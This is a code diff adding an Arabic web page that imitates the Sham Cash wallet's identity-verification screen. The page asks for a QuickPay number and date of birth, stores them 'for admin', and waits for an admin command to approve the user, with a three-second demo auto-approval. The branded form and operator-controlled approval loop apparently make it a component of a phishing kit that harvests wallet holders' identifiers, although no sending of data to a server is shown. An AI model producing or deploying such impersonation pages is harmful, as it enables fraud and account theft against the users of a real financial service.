@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شام كاش — التحقق من الهوية</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="page">
+    <div class="blob-left"></div>
+    <div class="blob-right"></div>
+
+    <div class="container" style="align-items:stretch">
+      <!-- Back button -->
+      <div style="padding-top:8px">
+        <a href="index.html" class="back-btn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M15 19l-7-7 7-7"/>
+          </svg>
+          <span id="backLabel">رجوع</span>
+        </a>
+      </div>
+
+      <!-- Logo -->
+      <div class="logo-wrap mt-10">
+        <div class="sham-logo">
+          <div class="shape-green"></div>
+          <div class="shape-purple"></div>
+        </div>
+      </div>
+
+      <!-- Header -->
+      <div style="text-align:center;margin-top:32px">
+        <h1 class="page-title" id="headingLabel" style="text-align:center">التحقق من هويتك</h1>
+        <p class="page-subtitle mt-2" id="subtitleLabel" style="text-align:center">
+          أدخل رقم كويك وتاريخ الميلاد للتحقق
+        </p>
+      </div>
+
+      <!-- Form -->
+      <form onsubmit="handleVerify(event)" style="margin-top:28px">
+        <div class="field-group">
+          <!-- QuickPay number -->
+          <div class="field">
+            <span class="field-icon">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                <line x1="12" y1="18" x2="12.01" y2="18"/>
+              </svg>
+            </span>
+            <input type="text" id="quickInput" inputmode="numeric"
+                   placeholder="رقم كويك" autocomplete="off" />
+          </div>
+
+          <!-- Date of birth -->
+          <div class="field">
+            <span class="field-icon">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+                <line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/>
+                <line x1="3" y1="10" x2="21" y2="10"/>
+              </svg>
+            </span>
+            <input type="date" id="dobInput" style="color-scheme:dark" />
+          </div>
+        </div>
+
+        <!-- Waiting indicator (hidden until submit) -->
+        <p class="link-text mt-6 hidden" id="waitingMsg" style="display:none">
+          <span class="spinner" style="display:inline-block;margin-left:6px"></span>
+          <span id="waitingLabel">جارٍ الانتظار...</span>
+        </p>
+
+        <!-- Submit button -->
+        <div class="mt-6">
+          <button type="submit" class="btn btn-primary btn-full" id="verifyBtn">
+            <span id="verifyBtnLabel">تحقق</span>
+          </button>
+        </div>
+      </form>
+
+      <!-- Success state (hidden by default) -->
+      <div id="successCard" class="status-card hidden">
+        <div class="status-icon">✅</div>
+        <h2 class="status-title text-green" id="successTitle">تم التحقق</h2>
+        <p class="status-sub" id="successSub">تم التحقق من هويتك بنجاح</p>
+        <a href="dashboard.html" class="btn btn-primary btn-full" id="dashboardBtn">الانتقال للوحة التحكم</a>
+      </div>
+
+      <!-- Error state (hidden by default) -->
+      <div id="errorCard" class="status-card hidden">
+        <div class="status-icon">❌</div>
+        <h2 class="status-title text-red" id="errorTitle">فشل التحقق</h2>
+        <p class="status-sub" id="errorSub">لم يتم التحقق من هويتك</p>
+        <button onclick="resetForm()" class="btn btn-secondary btn-full" id="retryBtn">المحاولة مجدداً</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Simulate admin approval after 3 seconds (demo)
+    let verifyTimer = null;
+
+    function handleVerify(e) {
+      e.preventDefault();
+      const quick = document.getElementById('quickInput').value.trim();
+      const dob   = document.getElementById('dobInput').value;
+      if (!quick || !dob) return;
+
+      // Store for admin
+      localStorage.setItem('sham_quick', quick);
+      localStorage.setItem('sham_dob', dob);
+      localStorage.setItem('sham_page', 'التحقق من الهوية');
+
+      // Show waiting state
+      document.getElementById('verifyBtn').disabled = true;
+      document.getElementById('waitingMsg').style.display = 'flex';
+      document.getElementById('waitingMsg').style.alignItems = 'center';
+      document.getElementById('waitingMsg').style.justifyContent = 'center';
+      document.getElementById('waitingMsg').classList.remove('hidden');
+
+      // Poll localStorage for admin command (or auto-approve after 3s in demo)
+      verifyTimer = setInterval(checkStatus, 800);
+      setTimeout(() => {
+        // Demo: auto-approve after 3s if no command set
+        if (!localStorage.getItem('sham_verify_status')) {
+          localStorage.setItem('sham_verify_status', 'approved');
+        }
+      }, 3000);
+    }
+
+    function checkStatus() {
+      const s = localStorage.getItem('sham_verify_status');
+      if (!s) return;
+      clearInterval(verifyTimer);
+      localStorage.removeItem('sham_verify_status');
+      document.getElementById('waitingMsg').style.display = 'none';
+      if (s === 'approved') {
+        document.querySelector('form').classList.add('hidden');
+        document.getElementById('successCard').classList.remove('hidden');
+      } else {
+        document.querySelector('form').classList.add('hidden');
+        document.getElementById('errorCard').classList.remove('hidden');
+      }
+    }
+
+    function resetForm() {
+      document.getElementById('errorCard').classList.add('hidden');
+      document.querySelector('form').classList.remove('hidden');
+      document.getElementById('verifyBtn').disabled = false;
+      document.getElementById('quickInput').value = '';
+      document.getElementById('dobInput').value = '';
+      localStorage.removeItem('sham_verify_status');
+    }
+  </script>
+</body>
+</html>
